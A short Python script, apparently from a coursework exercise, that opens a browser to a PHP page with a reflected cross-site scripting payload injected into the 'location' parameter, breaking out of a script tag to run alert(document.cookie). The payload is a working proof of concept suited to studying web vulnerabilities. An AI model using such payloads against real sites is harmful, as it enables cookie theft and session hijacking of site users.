import webbrowser

base_url = "http://iu.ru/Assignment/case05.php"
# print("Enter url for case02.php")
url = base_url + '?location="a</script><script>alert(document.cookie);</script>'

webbrowser.open(url, new=2)
